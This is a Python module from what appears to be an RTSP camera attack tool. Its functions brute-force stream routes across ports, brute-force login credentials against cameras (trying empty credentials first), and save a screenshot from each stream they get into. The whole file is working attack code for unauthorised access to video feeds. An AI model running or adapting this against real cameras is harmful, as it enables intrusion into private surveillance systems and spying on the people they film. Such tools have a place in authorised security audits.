import logging
from pathlib import Path
from typing import List

import av

from .cli.output import console
from .rtsp import RTSPClient, Status
from .utils import escape_chars

ROUTES: List[str]
CREDENTIALS: List[str]
PORTS: List[int]
DUMMY_ROUTE = "/0x8b6c42"
PICS_FOLDER: Path

logger = logging.getLogger()
logger_is_enabled = logger.isEnabledFor(logging.DEBUG)


def attack(target: RTSPClient, port=None, route=None, credentials=None):
    if port is None:
        port = target.port
    if route is None:
        route = target.route
    if credentials is None:
        credentials = target.credentials

    # Create socket connection.
    ok = target.connect(port)
    if not ok:
        if logger_is_enabled:
            if target.status is Status.UNIDENTIFIED:
                logger.debug(f"Failed to connect {target}:", exc_info=target.last_error)
            else:
                logger.debug(f"Failed to connect {target}: {target.status.name}")
        return False

    attack_url = RTSPClient.get_rtsp_url(target.ip, port, credentials, route)
    # Try to authorize: create describe packet and send it.
    ok = target.authorize(port, route, credentials)
    request = "\n\t".join(target.packet.split("\r\n")).rstrip()
    if target.data:
        response = "\n\t".join(target.data.split("\r\n")).rstrip()
    else:
        response = ""
    if logger_is_enabled:
        logger.debug(f"\nSent:\n\t{request}\nReceived:\n\t{response}")
    if not ok:
        if logger_is_enabled:
            logger.debug(
                f"Failed to authorize {attack_url}", exc_info=target.last_error
            )
        return False

    return True


def attack_route(target: RTSPClient):
    # If it's a 401 or 403, it means that the credentials are wrong but the route might be okay.
    # If it's a 200, the stream is accessed successfully.
    ok_codes = ["200", "401", "403"]

    # If the stream responds positively to the dummy route, it means
    # it doesn't require (or respect the RFC) a route and the attack
    # can be skipped.
    for port in PORTS:
        ok = attack(target, port=port, route=DUMMY_ROUTE)
        if ok and any(code in target.data for code in ok_codes):
            target.port = port
            target.routes.append("/")
            return target

        # Otherwise, bruteforce the routes.
        for route in ROUTES:
            ok = attack(target, port=port, route=route)
            if not ok:
                break
            if any(code in target.data for code in ok_codes):
                target.port = port
                target.routes.append(route)
                return target


def attack_credentials(target: RTSPClient):
    def _log_working_stream():
        console.print("Working stream at", target)
        if logger_is_enabled:
            logger.debug(
                f"Working stream at {target} with {target.auth_method.name} auth"
            )

    if target.is_authorized:
        _log_working_stream()
        return target

    # If it's a 404, it means that the route is incorrect but the credentials might be okay.
    # If it's a 200, the stream is accessed successfully.
    ok_codes = ["200", "404"]

    # If stream responds positively to no credentials, it means
    # it doesn't require them and the attack can be skipped.
    ok = attack(target, credentials=":")
    if ok and any(code in target.data for code in ok_codes):
        _log_working_stream()
        return target

    # Otherwise, bruteforce the routes.
    for cred in CREDENTIALS:
        ok = attack(target, credentials=cred)
        if not ok:
            return False
        if any(code in target.data for code in ok_codes):
            target.credentials = cred
            _log_working_stream()
            return target


def get_screenshot(target: RTSPClient, tries=0):
    file_name = escape_chars(f"{str(target).lstrip('rtsp://')}.jpg")
    file_path = PICS_FOLDER / file_name

    try:
        with av.open(
            str(target),
            options={
                "rtsp_transport": "tcp",
                "rtsp_flags": "prefer_tcp",
                "stimeout": "3000000",
            },
            timeout=60.0,
        ) as video:
            if (
                video.streams.video[0].profile is None
                and video.streams.video[0].start_time is None
                and video.streams.video[0].codec_context.format is None
            ):
                # There's a high possibility that this video stream is broken
                # or something else, so we try again just to make sure
                if tries == 2:
                    video.close()
                    tries += 1
                    return get_screenshot(target, tries)
                else:
                    if logger_is_enabled:
                        logger.debug(
                            f"Broken video stream or unknown issues with {target}"
                        )
                    return
            video.streams.video[0].thread_type = "AUTO"
            for frame in video.decode(video=0):
                frame.to_image().save(file_path)
                break
    except (MemoryError, PermissionError, av.InvalidDataError) as e:
        # Those errors occurs when there's too much SCREENSHOT_THREADS.
        if logger_is_enabled:
            logger.debug(f"Missed screenshot of {target}: {repr(e)}")
        # Try one more time in hope for luck.
        if tries == 2:
            tries += 1
            console.print("[yellow]Retry to get a screenshot of the", target)
            return get_screenshot(target, tries)
        else:
            console.print(
                f"[italic red]Missed screenshot of [underline]{str(target)}[/underline] - if you see this message a lot, consider reducing the number of screenshot threads",
            )
            return
    except Exception as e:
        if logger_is_enabled:
            logger.debug(f"get_screenshot failed with {target}: {repr(e)}")
        return

    console.print("[bold]Captured screenshot for", target)
    if logger_is_enabled:
        logger.debug(f"Captured screenshot for {target}")
    return file_path
